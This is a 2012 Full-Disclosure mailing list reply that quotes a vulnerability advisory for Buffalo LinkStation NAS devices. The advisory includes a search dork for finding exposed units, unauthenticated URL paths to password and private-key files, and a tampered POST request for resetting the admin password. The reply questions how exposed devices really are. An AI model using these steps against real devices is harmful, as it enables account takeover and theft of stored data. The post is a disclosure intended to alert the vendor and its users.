
Date: Sat, 01 Dec 2012 19:33:22 +0200
From: Troy Korjuslommi <tjk@...oft.com>
To: Hurgel Bumpf <l0rd_lunatic@...oo.com>
Cc: "full-disclosure@...ts.grok.org.uk" <full-disclosure@...ts.grok.org.uk>
Subject: Re: Buffalo Technology LinkStation Information
 Disclosure And Privilege Escalation

At least in my tests (on different LinkStations), the URIs only work
from the networks where admin has been authorized, using the admin port
(typically 80). I.e. typically wired LAN only. Still a very serious
problem (exposing passwords and private key), but not an issue for
WebAccess, since it uses another port and provides a different view of
the system. I.e. the URIs do not work over the WebAccess connection at
least on the LinkStations I tested. 

Can you confirm? It seems that you have the admin interface open to the
WAN. At least judging from the fact that the URIs used port 80, which is
the one for the admin interface, not for WebAccess.

Troy
Tksoft Inc.


On Fri, 2012-11-30 at 17:54 +0000, Hurgel Bumpf wrote:
> Release Date.              30-Nov-2012
> Last Update.               -
> Vendor Notification Date.  23.Dec.2011 
> 
> Product.                   Linkstation & Others
> 
> Platform.                  Buffalo Technology
> Affected versions.         Including Actual Version
> 
> Severity Rating.           Medium
> Impact.                    Privilege escalation, Information Disclosure
> 
> Attack Vector.             From remote
> Solution Status.           Don't use internet function aka. WebAccess
> CVE reference.             CVE - not yet assigned
> 
> 
> Buffalo doesn't has a security department. They always forwarded me to sales, as they thought the will help me there better. Never received any answer. Tried over some other companies to reach Buffalo, but they are not interested in vulnerabilities.
> I waited one year and nothing happend. So here we go...
> 
> 
> 
> Buffalo Linkstation Information Disclosure (Password, Certificate,..)
> + Google Dork 
> 
> +--->intitle:"LinkStation - LS-WTGL"  Copyright 2002-2008
> 
> (There are better ways to find them..)
> 
> 
> 
> [ WebAccess - Accessing shared folders via Browser. Disabled by default. Has to be enabled ]
> 
> If you find them online, a WebAccess ist enabled by 99.9%..
> 
> 
> No authentication needed to access the files!
> 
> 
> + Permission Settings (read) 
> +---> x.x.x.x/modules/webaxs/module/files/perm.conf
> 
> + Username & Password disclosure (htpasswd)
> +---> x.x.x.x/modules/webaxs/module/files/password
> 
> + Lighttpd Config
> +---> x.x.x.x/modules/webaxs/module/files/lighttpd.conf
> 
> + Lighttpd RSA Private & Public Key
> +---> x.x.x.x/modules/webaxs/module/files/host.pem
> 
> 
> Buffalo Linkstation Privilege Escalation (Admin Password Reset)
> 
> After you cracked the htpassword,  logon with a gained (unprivileged) username and reset the admin password.
> 
> To do so just use temperdata or intercept on burp and try to change your password. Enable temper and press the button to change your password.
> 
> In the POST request just change the User*Name fields with the name "admin". Make sure to keep the gSSS and gRRR as they are the "session cookies".
> Send the changed values and logon with the admin user again.
> 
> Example:
> 
> 
> 
>    Post Data:
>       hiddenPageId[user_add]
>       txtUserEditName[admin]   <--- Replace your username with admin here
>       txtUserEditOldName[admin]   <--- Replace your username with admin here
>       txtUserEditPassword1st[reset]  <-- Password of your favor
>       txtUserEditPassword2nd[reset]  <-- Password of your favor
>       txtUserEditComment[]
>       hiddenUserEditNameOld[admin]   <--- Replace your username with admin here
>       txtHelpSearch[]
>       gPage[user]
>       gMode[setup]
>       gType[undefined]
>       gKey[undefined]
>       gSSS[3ae1c32d69ff7a83594d9daa9c776ad8]
>       gRRR[666525125298680621]
>       hiddenDummyText[dummy]
>    Response Headers:
>       Date[Fri, 09 Dec 2011 16:42:13 GMT]
>       Server[Apache/1.3.34 (Unix)]
>       Cache-Control[no-store, no-cache, must-revalidate, post-check=0, pre-check=0]
>       Expires[Thu, 01 Dec 1994 16:00:00 GMT]
>       Pragma[no-cache]
>       Keep-Alive[timeout=15, max=100]
>       Connection[Keep-Alive]
>       Transfer-Encoding[chunked]
>       Content-Type[text/html; charset=UTF-8]
> You can download a firmware Image and unzip it (zip password is all over the internet). There you will find more "features". 
> It's just a very bad maintained linux. Bad filepermissions aso..
> 
> Buffalo: Your firmware is bad and you should feel bad!
> 
> AndrÃ©
> 
> _______________________________________________
> Full-Disclosure - We believe in it.
> Charter: http://lists.grok.org.uk/full-disclosure-charter.html
> Hosted and sponsored by Secunia - http://secunia.com/


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/